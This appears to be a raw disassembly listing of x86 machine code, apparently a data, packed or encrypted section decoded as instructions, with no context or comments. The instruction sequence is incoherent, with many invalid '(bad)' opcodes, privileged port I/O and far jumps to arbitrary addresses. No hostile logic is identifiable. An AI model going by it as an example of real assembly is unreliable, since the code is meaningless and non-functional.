  416d81:	fs jmp 0x45e8bec
  416d87:	lds    eax,FWORD PTR [ecx+0x77]
  416d8a:	push   esp
  416d8b:	push   DWORD PTR ds:0x8b52d8ad
  416d91:	(bad)  [ecx]
  416d93:	lods   eax,DWORD PTR ds:[esi]
  416d94:	push   es
  416d95:	shr    DWORD PTR [edi],1
  416d97:	pop    eax
  416d98:	push   0x2fcbfb2
  416d9d:	mov    bh,0x58
  416d9f:	outs   dx,BYTE PTR ds:[esi]
  416da0:	push   ebp
  416da1:	jnp    0x416dc4
  416da3:	pop    ebp
  416da4:	test   BYTE PTR [ebx],dl
  416da6:	pop    ebp
  416da7:	stos   DWORD PTR es:[edi],eax
  416da8:	cwde   
  416da9:	push   ecx
  416daa:	sbb    al,0x7f
  416dac:	sbb    al,0xfd
  416dae:	in     al,dx
  416daf:	fisttp DWORD PTR [ecx-0x38]
  416db2:	xchg   ebp,eax
  416db3:	cwde   
  416db4:	and    dl,BYTE PTR [esi+0x4ec73b53]
  416dba:	or     dh,BYTE PTR [ebp-0x6b93a82f]
  416dc0:	jno    0x416d7c
  416dc2:	inc    edx
  416dc3:	fistp  WORD PTR [ecx+0x2d]
  416dc6:	xor    DWORD PTR [esp+eax*8],edx
  416dc9:	xchg   BYTE PTR [esi+0xe7ad004],dl
  416dcf:	sti    
  416dd0:	cmp    esp,ecx
  416dd2:	jbe    0x416dc4
  416dd4:	stc    
  416dd5:	mov    BYTE PTR [edx-0x555cdef6],ch
  416ddb:	inc    esp
  416ddc:	mov    gs,WORD PTR [esi-0x53]
  416ddf:	fwait
  416de0:	in     al,dx
  416de1:	sub    eax,0xca2e454b
  416de6:	pop    ebp
  416de7:	inc    eax
  416de8:	push   DWORD PTR [ebp+0x6c541f13]
  416dee:	call   0xf4c8:0xf2a87c60
  416df5:	lods   eax,DWORD PTR ds:[esi]
  416df6:	aas    
  416df7:	push   edx
  416df8:	popf   
  416df9:	sub    eax,0xdf19b02f
  416dfe:	int    0x9f
  416e00:	jo     0x416dbd
  416e02:	sbb    al,0x4d
  416e04:	aas    
  416e05:	pusha  
  416e06:	jno    0x416dd7
  416e08:	cli    
  416e09:	(bad)  
  416e0b:	jns    0x416e70
  416e0d:	inc    ebx
  416e0e:	jbe    0x416e8f
  416e10:	add    cl,BYTE PTR [ecx]
  416e12:	sub    bl,BYTE PTR [edx-0x5c]
  416e15:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416e16:	rcr    DWORD PTR [edi],0x39
  416e19:	inc    esi
  416e1a:	test   BYTE PTR [edi-0x43],0xc3
  416e1e:	pop    edi
  416e1f:	pop    ecx
  416e20:	xor    BYTE PTR [edx-0x30],cl
  416e23:	ins    BYTE PTR es:[edi],dx
  416e24:	fisttp DWORD PTR [edi+0x19]
  416e27:	div    BYTE PTR [eax]
  416e29:	out    dx,eax
  416e2a:	lahf   
  416e2b:	repnz cmp DWORD PTR [esp+edx*4+0x724981ff],edx
  416e33:	and    al,0xb5
  416e35:	leave  
  416e36:	sub    DWORD PTR [ebx],0xb
  416e39:	shl    bh,0xbd
  416e3c:	cmp    BYTE PTR [ecx+0x72e4b6f8],0xc2
  416e43:	push   eax
  416e44:	push   ebx
  416e45:	adc    al,0x89
  416e47:	fbstp  TBYTE PTR [ebx+ebx*8-0xe]
  416e4b:	retf   
  416e4c:	mov    eax,0x1dcd8b7b
  416e51:	mov    esi,0x25276a42
  416e56:	mov    bh,0xc1
  416e58:	bt     DWORD PTR [esi-0x20],eax
  416e5c:	popa   
  416e5d:	push   esi
  416e5e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416e5f:	in     al,0xef
  416e61:	cmp    BYTE PTR [esi+ebx*2],dh
  416e64:	pop    edx
  416e65:	jbe    0x416ee6
  416e67:	int    0xbd
  416e69:	jo     0x416ea4
  416e6b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416e6c:	cmp    DWORD PTR [esi+0x5b9789af],edx
  416e72:	xchg   DWORD PTR [ebx+0x2cdfdf18],edx
  416e78:	or     eax,0x1d0bb151
  416e7d:	iret   
  416e7e:	scas   eax,DWORD PTR es:[edi]
  416e7f:	aad    0xeb
  416e81:	jmp    0x8eba:0x499b4772
  416e88:	test   BYTE PTR [ebp-0x27803932],0x11
  416e8f:	or     al,0xcf
  416e91:	(bad)  
  416e92:	daa    
  416e93:	loopne 0x416f05
  416e95:	cwde   
  416e96:	int    0x63
  416e98:	push   edi
  416e99:	pop    ds
  416e9a:	repz data16 rol BYTE PTR ds:[ebx+0x628484b9],cl
  416ea3:	out    0xcb,eax
  416ea5:	mov    ds:0x511852d0,al
  416eaa:	call   0xaf0e3263
  416eaf:	jb     0x416e6e
  416eb1:	cdq    
  416eb2:	sbb    al,0xfe
  416eb4:	push   esp
  416eb5:	push   esi
  416eb6:	(bad)  
  416eb7:	jo     0x416e6b
  416eb9:	pop    ebx
  416eba:	pop    ecx
  416ebb:	push   esi
  416ebc:	mov    dl,0x96
  416ebe:	xor    eax,0x60877cbb
  416ec3:	xor    bl,BYTE PTR [ebp+ecx*2-0x1c]
  416ec7:	cmp    esi,edi
  416ec9:	jo     0x416e95
  416ecb:	push   esi
  416ecc:	retf   0xfc43
  416ecf:	cli    
  416ed0:	out    dx,eax
  416ed1:	in     al,dx
  416ed2:	inc    edi
  416ed3:	lar    esp,WORD PTR [eax-0x1d]
  416ed7:	popf   
  416ed8:	lods   al,BYTE PTR ds:[esi]
  416ed9:	aam    0x60
  416edb:	xchg   ecx,eax
  416edc:	cmp    eax,0x393dfec
  416ee1:	sub    eax,0xeb26521b
  416ee6:	and    DWORD PTR [esi+0x74],esp
  416ee9:	cmc    
  416eea:	pop    ebp
  416eeb:	mov    ch,0x5e
  416eed:	xor    BYTE PTR [esi-0x3b],ch
  416ef0:	push   0xb39953d0
  416ef5:	je     0x416e7c
  416ef7:	push   edi
  416ef8:	dec    eax
  416ef9:	sbb    al,0xef
  416efb:	aas    
  416efc:	dec    eax
  416efd:	push   edx
  416efe:	shl    DWORD PTR [esi-0x1e],cl
  416f01:	and    ebx,ecx
  416f03:	mov    cl,BYTE PTR [esi]
  416f05:	mov    ebp,0x6efbdd7e
  416f0a:	sub    ebp,DWORD PTR [eax-0x2e7e188c]
  416f10:	addr16 into 
  416f12:	xlat   BYTE PTR ds:[ebx]
  416f13:	out    0x30,al
  416f15:	test   BYTE PTR [edi+0x1b],ch
  416f18:	mov    dh,0x18
  416f1a:	fstp   QWORD PTR [edi+0x56]
  416f1d:	popa   
  416f1e:	cmp    eax,0x9d396927
  416f23:	(bad)  
  416f24:	sahf   
  416f25:	sub    al,0x22
  416f27:	jmp    DWORD PTR [ebx+edi*1+0x11]
  416f2b:	push   cs
  416f2c:	fdivr  DWORD PTR [esi-0x6f]
  416f2f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416f30:	mov    ah,BYTE PTR [edi-0x7eb4454b]
  416f36:	mov    cl,0x98
  416f38:	in     al,dx
  416f39:	add    eax,0x39b5e3ea
  416f3e:	sbb    eax,0x8b73bfeb
  416f43:	and    BYTE PTR [edx-0x5a24759c],ah
  416f49:	pop    ebp
  416f4a:	adc    DWORD PTR [esi-0x67],0xe0de48e9
  416f51:	xor    eax,0xdb52e908
  416f56:	mov    ebx,0x200e93c6
  416f5b:	jmp    0x85c4a47a
  416f60:	add    bh,BYTE PTR [eax+0x2c]
  416f63:	pop    esi
  416f64:	loop   0x416f58
  416f66:	xchg   DWORD PTR [ebp-0x4e73b1ea],edx
  416f6c:	sub    al,0x10
  416f6e:	push   es
  416f6f:	ds ret 
  416f71:	ret    0x2bf9
  416f74:	xchg   esi,eax
  416f75:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416f76:	dec    ebp
  416f77:	xor    bh,BYTE PTR [eax]
  416f79:	test   eax,0xaac528ee
  416f7e:	bound  ebx,QWORD PTR ds:0x9297ca35
  416f84:	xchg   ebx,eax
  416f85:	mov    ds:0xf6639b63,eax
  416f8a:	or     DWORD PTR [esi],eax
  416f8c:	cwde   
  416f8d:	(bad)  
  416f8e:	js     0x416f29
  416f90:	in     al,0xec
  416f92:	repnz in al,0x1e
  416f95:	int3   
  416f96:	daa    
  416f97:	xor    DWORD PTR [ebp-0x516a3b94],esi
  416f9d:	cmp    al,0xea
  416f9f:	jbe    0x416ff9
  416fa1:	ins    DWORD PTR es:[edi],dx
  416fa2:	(bad)  
  416fa3:	push   ecx
  416fa4:	xchg   bp,ax
  416fa6:	out    0x8e,eax
  416fa8:	fsub   QWORD PTR [ebx-0x1c7a37f7]
  416fae:	imul   esi,DWORD PTR [edx+0x14],0x194d6afe
  416fb5:	mov    edi,0xf4276cc3
  416fbb:	or     BYTE PTR ds:0xb65b5921,cl
  416fc1:	retf   0xb49d
  416fc4:	mov    bl,0x38
  416fc6:	push   cs
  416fc7:	enter  0x8262,0x2c
  416fcb:	inc    eax
  416fcc:	pop    DWORD PTR [ebx+esi*8-0x72]
  416fd0:	ins    DWORD PTR es:[edi],dx
  416fd1:	push   cs
  416fd2:	pop    ebx
  416fd3:	or     DWORD PTR ds:0x3ce699e4,ebp
  416fd9:	pop    esi
  416fda:	dec    eax
  416fdb:	ja     0x417019
  416fdd:	(bad)  
  416fde:	rol    BYTE PTR [edx+ebp*8+0x38],1
  416fe2:	push   ebp
  416fe3:	push   eax
  416fe4:	sub    ah,cl
  416fe6:	sbb    edx,0xffffffb1
  416fe9:	and    edx,DWORD PTR [esp+esi*2-0x2a]
  416fed:	xchg   BYTE PTR [esi+0x3c],al
  416ff0:	mov    ebx,0x50955e1a
  416ff5:	add    dh,BYTE PTR [eax-0x66276610]
  416ffb:	pop    eax
  416ffc:	mov    edx,DWORD PTR [ebp-0x4f]
  416fff:	dec    ecx
  417000:	inc    esp
  417001:	sub    eax,0x9e7caec0
  417006:	or     dh,bl
  417008:	mov    ds:0x46dc09e2,eax
  41700d:	or     al,0xa3
  41700f:	ins    DWORD PTR es:[edi],dx
  417010:	mov    al,0xda
  417012:	xor    edx,0x11
  417015:	popf   
  417016:	(bad)  
  417017:	leave  
  417018:	jg     0x416fef
  41701a:	lea    esp,[ebp+0x194b88af]
  417020:	int3   
  417021:	(bad)  [ebp-0x2a]
  417024:	aam    0xe3
  417026:	(bad)  
  417027:	call   0xc364:0x3137586a
  41702e:	jbe    0x416fc8
  417030:	into   
  417031:	loop   0x416fe4
  417033:	inc    esp
  417034:	inc    edi
  417035:	and    BYTE PTR [esi],cl
  417037:	fidivr DWORD PTR [esi]
  417039:	lods   al,BYTE PTR ds:[esi]
  41703a:	aas    
  41703b:	pop    eax
  41703c:	iret   
  41703d:	popf   
  41703e:	ret    0x4eff
  417041:	inc    edx
  417042:	or     edx,DWORD PTR ds:0x40127a70
  417048:	ja     0x416fd3
  41704a:	and    dh,BYTE PTR [edx+ebx*4+0xb6a3716]
  417051:	push   eax
  417052:	adc    ebp,DWORD PTR [ebx+0x1bafd0d3]
  417058:	inc    ebx
  417059:	pop    esp
  41705a:	push   0xffffffa8
  41705c:	xchg   edx,eax
  41705d:	ja     0x417085
  41705f:	call   0x2e62de69
  417064:	add    al,0x4
  417066:	sbb    eax,0xe568d1f3
  41706b:	icebp  
  41706c:	sbb    eax,0x9ad15357
  417071:	cmp    edx,esp
  417073:	in     eax,0xeb
  417075:	and    DWORD PTR [eax-0x4c36528],eax
  41707b:	out    0xb5,eax
  41707d:	sbb    eax,DWORD PTR ds:0x32f0b272
  417083:	pop    esp
  417084:	mov    esp,0xc213797a
  417089:	mov    ds:0x8ac8a592,eax
  41708e:	cld    
  41708f:	rcr    BYTE PTR [ecx-0x32],1
  417092:	push   0x2e
  417094:	in     al,0x38
  417096:	(bad)  
  417097:	mov    esp,0xcd46eb01
  41709c:	daa    
  41709d:	sub    ebp,DWORD PTR [ebx+ecx*2+0x73]
  4170a1:	push   ebx
  4170a2:	pop    es
  4170a3:	and    bh,BYTE PTR cs:[edx+0x7b5212b7]
  4170aa:	in     al,0x31
  4170ac:	and    DWORD PTR [ebx+0x65],ecx
  4170af:	ret    
  4170b0:	or     BYTE PTR [edi-0x209bd921],bh
  4170b6:	out    dx,eax
  4170b7:	scas   al,BYTE PTR es:[edi]
  4170b8:	loopne 0x4170ae
  4170ba:	cmc    
  4170bb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4170bc:	or     BYTE PTR [ebx-0x21],bh
  4170bf:	xor    ch,BYTE PTR [ebp+0x76fd1b04]
  4170c5:	push   ebp
  4170c6:	xor    ebx,0xa691a2cb
  4170cc:	inc    edx
  4170cd:	int3   
  4170ce:	icebp  
  4170cf:	mov    cl,0x83
  4170d1:	js     0x417080
  4170d3:	fcos   
  4170d5:	aas    
  4170d6:	push   0xfffffffb
  4170d8:	pop    ss
  4170d9:	and    edx,DWORD PTR [ecx]
  4170db:	stc    
  4170dc:	adc    bl,bl
  4170de:	lahf   
  4170df:	mov    ebp,0x88045a44
  4170e4:	fisttp DWORD PTR [edx]
  4170e6:	mov    ds:0xdc36e38b,eax
  4170eb:	jne    0x4170b8
  4170ed:	lock pop ebx
  4170ef:	jl     0x4170c4
  4170f1:	mov    dh,0x8
  4170f3:	in     al,dx
  4170f4:	mov    al,ds:0xa0c4e516
  4170f9:	sbb    al,0xe5
  4170fb:	in     al,dx
  4170fc:	xor    bh,dl
  4170fe:	(bad)  
  4170ff:	jl     0x41717a
  417101:	mov    esp,0xc98b8d90
  417106:	cmp    ebp,0x12
  417109:	add    DWORD PTR [edx+0x3ef03c8],edx
  41710f:	les    esi,FWORD PTR [ecx]
  417111:	adc    BYTE PTR [edx+0x6f],0xdd
  417115:	push   es
  417116:	sar    DWORD PTR [edi-0x4d],cl
  417119:	jb     0x417139
  41711b:	mov    eax,0xdea0b750
  417120:	adc    BYTE PTR [edx+0x4],al
  417123:	sbb    BYTE PTR [eax+eax*2],dh
  417126:	mov    esp,0xc8d947f9
  41712b:	test   DWORD PTR [edi],ebp
  41712d:	pop    edi
  41712e:	adc    ax,0xc864
  417132:	data16 jle 0x4170fc
  417135:	dec    ebx
  417136:	jno    0x41716b
  417138:	or     al,0xf2
  41713a:	push   esp
  41713b:	ins    BYTE PTR es:[edi],dx
  41713c:	ret    
  41713d:	hlt    
  41713e:	leave  
  41713f:	jae    0x417135
  417141:	daa    
  417142:	add    DWORD PTR [edi+0xd99a894],ecx
  417148:	nop
  417149:	mov    cl,0x20
  41714b:	fidiv  WORD PTR [edi+0x68725fde]
  417151:	addr16 mov ecx,0x9e37afd4
  417157:	push   ss
  417158:	pop    esp
  417159:	inc    ebx
  41715a:	loop   0x41714e
  41715c:	bound  ebx,QWORD PTR [edx]
  41715e:	iret   
  41715f:	xchg   ebx,eax
  417160:	sbb    dl,BYTE PTR [edx+eax*2]
  417163:	jne    0x4170ea
  417165:	enter  0x5bcb,0x93
  417169:	mov    eax,ds:0x4c83307a
  41716e:	pop    edi
  41716f:	fist   WORD PTR [edx+0x49c1b078]
  417175:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417176:	push   cs
  417177:	fbstp  TBYTE PTR [edi-0x215b67ff]
  41717d:	cmp    al,0x81
  41717f:	inc    ebp
  417180:	jnp    0x4171ac
  417182:	test   BYTE PTR [ebp-0x345c0578],ah
  417188:	xchg   ebx,eax
  417189:	loope  0x4171a1
  41718b:	ret    
  41718c:	aam    0xe6
  41718e:	adc    eax,0x8e6a6359
  417193:	inc    esi
  417194:	jmp    FWORD PTR ds:[eax]
  417197:	sbb    al,0x73
  417199:	popa   
  41719a:	mov    esp,0x1a1c935a
  41719f:	add    edi,DWORD PTR [edi-0x20]
  4171a2:	sbb    al,0xdd
  4171a4:	(bad)  
  4171a5:	or     al,0x37
  4171a7:	test   BYTE PTR [edx+0x4c],bl
  4171aa:	xchg   esp,eax
  4171ab:	jp     0x417190
  4171ad:	adc    DWORD PTR [ebx+0xf],0x49d20705
  4171b4:	pop    ds
  4171b5:	lods   al,BYTE PTR ds:[esi]
  4171b6:	jo     0x4171c4
  4171b8:	xor    DWORD PTR [ebp-0x12],edi
  4171bb:	mov    dh,0x13
  4171bd:	popf   
  4171be:	sub    bl,dh
  4171c0:	sub    eax,0xb10400c1
  4171c5:	inc    ecx
  4171c6:	cwde   
  4171c7:	push   esi
  4171c8:	add    BYTE PTR ds:0x6c73e24e,0x7f
  4171cf:	jmp    0x4171f1
  4171d1:	adc    DWORD PTR [ebp-0x5],esp
  4171d4:	(bad)  
  4171d6:	pop    edx
  4171d7:	js     0x417253
  4171d9:	mov    eax,ds:0x406d26d
  4171de:	sbb    ch,BYTE PTR [edx-0x25]
  4171e1:	xor    eax,eax
  4171e3:	dec    eax
  4171e4:	pop    eax
  4171e5:	outs   dx,BYTE PTR ds:[esi]
  4171e6:	or     eax,DWORD PTR [esi]
  4171e8:	or     eax,0xe30712ca
  4171ed:	push   0x67
  4171ef:	or     al,BYTE PTR [edi+0x5e3420aa]
  4171f5:	adc    DWORD PTR [edi],edx
  4171f7:	sbb    eax,0x4c8eb906
  4171fc:	je     0x417249
  4171fe:	add    BYTE PTR [esi+0x5516610d],bl
  417204:	and    dl,0xb5
  417207:	pushf  
  417208:	call   FWORD PTR cs:[edi-0x4]
  41720c:	jle    0x41725a
  41720e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41720f:	fucom  st(2)
  417211:	mov    cl,0x85
  417213:	stc    
  417214:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417215:	and    eax,0x33cb43c9
  41721a:	inc    eax
  41721b:	dec    ebx
  41721c:	iret   
  41721d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41721e:	inc    edi
  41721f:	mov    cl,0x80
  417221:	inc    ebp
  417222:	ins    BYTE PTR es:[edi],dx
  417223:	dec    esi
  417224:	and    BYTE PTR [edi],bh
  417226:	adc    eax,0x8928bc6a
  41722b:	pop    esp
  41722c:	in     eax,0xeb
  41722e:	sbb    al,0x4e
  417230:	inc    ebp
  417231:	xchg   ebx,eax
  417232:	push   ecx
  417233:	cmp    DWORD PTR [edx+eiz*8+0x55d2fa1d],esi
  41723a:	inc    ecx
  41723b:	inc    esp
  41723c:	daa    
  41723d:	repz pop esi
  41723f:	jg     0x41724b
  417241:	inc    edi
  417242:	dec    BYTE PTR [edx+0x22827194]
  417248:	repz push esp
  41724a:	into   
  41724b:	jnp    0x417261
  41724d:	rcr    DWORD PTR [eax],0xbd
  417250:	mov    bh,0xeb
  417252:	sub    BYTE PTR ds:0x6236a2c8,al
  417258:	loope  0x4171f9
  41725a:	call   0x656fab71
  41725f:	popf   
  417260:	mov    eax,ds:0x39626279
  417265:	fdivp  st(7),st
  417267:	jge    0x417265
  417269:	test   al,0xf3
  41726b:	rcl    BYTE PTR [esp+ebx*2+0x41],0x48
  417270:	inc    eax
  417271:	lock xor esi,DWORD PTR [esi]
  417274:	enter  0x43d9,0xc0
  417278:	cdq    
  417279:	ret    
  41727a:	mov    edx,0x9139c09f
  41727f:	das    
  417280:	pop    ebp
  417281:	iret   
  417282:	pop    ecx
  417283:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417284:	sbb    DWORD PTR [esi-0x668a31dc],ebp
  41728a:	test   cl,0xae
  41728d:	sbb    BYTE PTR [esi],dh
  41728f:	test   DWORD PTR [edi+0x76c2de9a],0xe841b28e
  417299:	std    
  41729a:	pop    DWORD PTR [edx+0x4d]
  41729d:	jno    0x417255
  41729f:	or     dl,BYTE PTR [edx+edx*8+0x7687fe18]
  4172a6:	dec    ebp
  4172a7:	inc    ebp
  4172a8:	pop    ax
  4172aa:	aam    0xe7
  4172ac:	sbb    ebp,ecx
  4172ae:	aas    
  4172af:	xlat   BYTE PTR ds:[ebx]
  4172b0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4172b1:	add    eax,0xd75d5686
  4172b6:	jb     0x417310
  4172b8:	mov    DWORD PTR [ebp-0x409c6639],esp
  4172be:	inc    ebx
  4172bf:	mov    DWORD PTR [ecx+0x5e],edx
  4172c2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4172c3:	scas   eax,DWORD PTR es:[edi]
  4172c4:	mov    bl,bh
  4172c6:	test   BYTE PTR [ecx],al
  4172c8:	pop    es
  4172c9:	addr16 test eax,0x5d850dd5
  4172cf:	pop    esi
  4172d0:	lods   al,BYTE PTR ds:[esi]
  4172d1:	nop
  4172d2:	mov    esp,0x18ab17b7
  4172d7:	mov    dh,0xfc
  4172d9:	add    eax,DWORD PTR [edi+0x7cd9eda8]
  4172df:	clc    
  4172e0:	retf   
  4172e1:	add    al,0x2
  4172e3:	cli    
  4172e4:	add    ch,bh
  4172e6:	ret    0xdf43
  4172e9:	ds inc edx
  4172eb:	dec    ebx
  4172ec:	ficomp DWORD PTR [ecx-0x635f4ced]
  4172f2:	lea    ebp,[esi+edi*4-0x7c8ba6c2]
  4172f9:	daa    
  4172fa:	jg     0x4172b9
  4172fc:	mov    eax,cs
  4172fe:	out    dx,eax
  4172ff:	sbb    eax,0xf36e6ecb
  417304:	push   esi
  417305:	dec    ebp
  417306:	mov    ds:0xaf316abd,al
  41730b:	dec    esi
  41730c:	inc    esp
  41730d:	dec    esp
  41730e:	test   BYTE PTR [ecx-0xbc3c88f],dl
  417314:	jge    0x41736c
  417316:	test   DWORD PTR [ecx],ecx
  417318:	fcmovu st,st(7)
  41731a:	sbb    bh,BYTE PTR [ecx]
  41731c:	call   0xba5449aa
  417321:	jno    0x41736e
  417323:	mov    ebp,0x1d134770
  417328:	ins    DWORD PTR es:[edi],dx
  417329:	arpl   WORD PTR [ebp+edx*1+0xe],si
  41732d:	sub    cl,cl
  41732f:	push   ecx
  417330:	xchg   ebp,eax
  417331:	sub    ah,ah
  417333:	or     ch,BYTE PTR [esi]
  417335:	je     0x4172ed
  417337:	jp     0x417370
  417339:	mov    ecx,ebp
  41733b:	xchg   esp,eax
  41733c:	cmp    al,0x84
  41733e:	into   
  41733f:	adc    DWORD PTR [ebx+eiz*4+0x7f],esi
  417343:	iret   
  417344:	xchg   esp,eax
  417345:	hlt    
  417346:	add    al,0xa4
  417348:	imul   esp,ebp,0x15
  41734b:	and    ah,bh
  41734d:	std    
  41734e:	enter  0x84cb,0x5e
  417352:	(bad)  
  417353:	jno    0x417303
  417355:	les    edx,FWORD PTR [ecx]
  417357:	idiv   BYTE PTR [ebx+0x5c]
  41735a:	and    edx,DWORD PTR [ebp+0x57]
  41735d:	pop    ebx
  41735e:	cmp    BYTE PTR [eax+0x8],bh
  417361:	je     0x4173da
  417363:	imul   ecx,DWORD PTR [eax],0xffffffd3
  417366:	lds    ecx,FWORD PTR [edi+0x31]
  417369:	mov    edx,0x90c35283
  41736e:	fcomp  DWORD PTR [ebx+0x7c]
  417371:	fadd   st(5),st
  417373:	push   esi
  417374:	sbb    eax,0xa6a1b150
  417379:	stos   DWORD PTR es:[edi],eax
  41737a:	mov    dl,0x4f
  41737c:	adc    al,0x59
  41737e:	sub    cl,dl
  417380:	fild   WORD PTR [esi]
  417382:	loopne 0x4173f9
  417384:	pavgw  mm7,QWORD PTR [eax-0x6923c858]
  41738b:	shl    BYTE PTR [esi+0x49],1
  41738e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41738f:	jl     0x417374
  417391:	nop
  417392:	mul    DWORD PTR [eax-0x2331c8f4]
  417398:	fwait
  417399:	hlt    
  41739a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41739b:	dec    eax
  41739c:	popf   
  41739d:	ins    DWORD PTR es:[edi],dx
  41739e:	out    dx,eax
  41739f:	imul   eax,DWORD PTR [ebx],0xffffffc3
  4173a2:	xchg   ebp,eax
  4173a3:	pop    es
  4173a4:	adc    eax,0x761f69a2
  4173a9:	cdq    
  4173aa:	stos   BYTE PTR es:[edi],al
  4173ab:	(bad)  
  4173ac:	jmp    0x1ee09c89
  4173b1:	sar    DWORD PTR [eax+0x787d8071],0x5e
  4173b8:	jae    0x417362
  4173ba:	stos   BYTE PTR es:[edi],al
  4173bb:	popa   
  4173bc:	push   cs
  4173bd:	xchg   edi,eax
  4173be:	(bad)  
  4173bf:	je     0x4173c9
  4173c1:	out    0x3f,eax
  4173c3:	rol    BYTE PTR [ebx],1
  4173c5:	sar    BYTE PTR [ecx-0x6f0ba51a],0x64
  4173cc:	iret   
  4173cd:	push   edx
  4173ce:	xlat   BYTE PTR ds:[ebx]
  4173cf:	jmp    0x6fba:0xfdeaed89
  4173d6:	jae    0x4173e9
  4173d8:	idiv   BYTE PTR [edx*4+0x223356a1]
  4173df:	mov    cl,0xab
  4173e1:	add    BYTE PTR [ebx],dl
  4173e3:	sbb    dh,BYTE PTR [esp+edi*1]
  4173e6:	xlat   BYTE PTR ds:[ebx]
  4173e7:	cmp    eax,0x1340aeaf
  4173ec:	and    bh,BYTE PTR [ecx]
  4173ee:	xor    al,0x9e
  4173f0:	jae    0x41745f
  4173f2:	push   eax
  4173f3:	push   ebp
  4173f4:	test   edx,0x177ea71f
  4173fa:	stos   DWORD PTR es:[edi],eax
  4173fb:	jecxz  0x417399
  4173fd:	int    0x9b
  4173ff:	or     eax,0x2141db2
  417404:	adc    eax,0x380c1f2a
  417409:	xor    DWORD PTR [ebp-0x31],ebp
  41740c:	fdiv   DWORD PTR [ecx-0x6d166cfd]
  417412:	sbb    eax,edx
  417414:	push   esi
  417415:	das    
  417416:	outs   dx,DWORD PTR ds:[esi]
  417417:	int    0x9f
  417419:	or     BYTE PTR [edi-0x45],0x44
  41741d:	mov    ds:0x74d75fa4,eax
  417422:	into   
  417423:	mov    ds:0x3013e384,al
  417428:	ja     0x417402
  41742a:	fcom   QWORD PTR [ebx+edx*4+0x797eb5f3]
  417431:	dec    esp
  417432:	ins    BYTE PTR es:[edi],dx
  417433:	add    eax,0x2de5ec1
  417438:	loop   0x417438
  41743a:	xor    eax,0x5c4f923b
  41743f:	sub    ebx,DWORD PTR [ebp-0x68fb730c]
  417445:	jo     0x417412
  417447:	bnd call 0x73ab8cde
  41744d:	mov    ?,WORD PTR ss:[edi+0x9]
  417451:	xchg   DWORD PTR [ebx],ecx
  417453:	cs (bad) 
  417455:	and    al,0x6f
  417457:	ret    
  417458:	add    DWORD PTR [edx-0x41],esi
  41745b:	(bad)  
  41745c:	push   ebx
  41745d:	aas    
  41745e:	mov    ds:0x36d01796,eax
  417463:	mov    ds:0xd4a19a72,al
  417468:	aam    0x6c
  41746a:	or     al,BYTE PTR [edx]
  41746c:	xchg   esi,eax
  41746d:	fsub   st(2),st
  41746f:	mov    cl,al
  417471:	(bad)  
  417472:	popa   
  417473:	fidiv  WORD PTR [edi+0x4c]
  417476:	xchg   edi,eax
  417477:	sti    
  417478:	repnz outs dx,DWORD PTR ds:[esi]
  41747a:	sub    ch,bh
  41747c:	and    eax,esi
  41747e:	adc    eax,0xfb276473
  417483:	sub    eax,0xb582684c
  417488:	lea    eax,[edi+0x289ab2f8]
  41748e:	(bad)
  417491:	arpl   bp,cx
  417493:	stc    
  417494:	add    esi,DWORD PTR [ebx+0x42]
  417497:	int    0x1c
  417499:	cwde   
  41749a:	lock ds retf 
  41749d:	stos   BYTE PTR es:[edi],al
  41749e:	test   al,0x6
  4174a0:	mov    DWORD PTR [edx+0xf481c20],esp
  4174a6:	sbb    al,0xbf
  4174a8:	jp     0x4174c8
  4174aa:	add    edi,eax
  4174ac:	pop    ss
  4174ad:	mov    edx,0xcb586fa2
  4174b2:	ins    DWORD PTR es:[edi],dx
  4174b3:	xchg   DWORD PTR [edx+0x3b],ebx
  4174b6:	fld    QWORD PTR [esp+edi*8+0x1623d3d4]
  4174bd:	mov    ds:0x152e9366,eax
  4174c2:	out    dx,eax
  4174c3:	mov    ds:0xadbcd284,al
  4174c8:	cli    
  4174c9:	mov    WORD PTR [ebx-0x1d],ds
  4174cc:	push   ebx
  4174cd:	stos   DWORD PTR es:[edi],eax
  4174ce:	lea    edi,ds:0xbae82c44
  4174d4:	cmp    dl,BYTE PTR ds:0x646919fc
  4174da:	mov    ds:0xe7d061b9,eax
  4174df:	jno    0x41749a
  4174e1:	or     edx,eax
  4174e3:	lds    edi,FWORD PTR [esi-0x1b4726ee]
  4174e9:	pop    eax
  4174ea:	retf   
  4174eb:	push   es
  4174ec:	inc    edx
  4174ed:	nop
  4174ee:	bound  ecx,QWORD PTR [ebx+0x656fb6f8]
  4174f4:	cmp    esp,DWORD PTR [eax-0x561f9176]
  4174fa:	push   ebx
  4174fb:	xor    al,0xcd
  4174fd:	fimul  WORD PTR [bx+di]
  417500:	pop    edx
  417501:	neg    BYTE PTR [edx+0x5a9dc3a5]
  417507:	imul   esp,DWORD PTR [edx-0x21afefc7],0xffffffce
  41750e:	inc    esp
  41750f:	fwait
  417510:	sbb    al,0xb8
  417512:	stos   BYTE PTR es:[edi],al
  417513:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417514:	lds    esp,FWORD PTR [ecx-0x16]
  417517:	sub    esp,DWORD PTR [eax-0xa]
  41751a:	outs   dx,DWORD PTR ds:[esi]
  41751b:	in     eax,dx
  41751c:	retf   0xd81
  41751f:	dec    edx
  417520:	xchg   esi,eax
  417521:	stc    
  417522:	xchg   BYTE PTR [ebp+0x3e],dl
  417525:	scas   al,BYTE PTR es:[edi]
  417526:	mov    bh,0xbc
  417528:	lahf   
  417529:	jl     0x4174fd
  41752b:	fdiv   DWORD PTR [edx+0x3ecbfcbc]
  417531:	fs pusha 
  417533:	aas    
  417534:	shl    BYTE PTR [ebx],0x2d
  417537:	daa    
  417538:	inc    ecx
  417539:	mov    ds:0x68794b96,eax
  41753e:	inc    ebp
  41753f:	xor    eax,0x98b9ac75
